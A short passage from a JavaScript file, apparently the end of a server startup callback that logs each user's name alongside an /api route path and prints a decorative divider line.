  users.forEach((u, l) => console.log(`   ✅ ${u.name}: /api/${l}/*`));
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
});
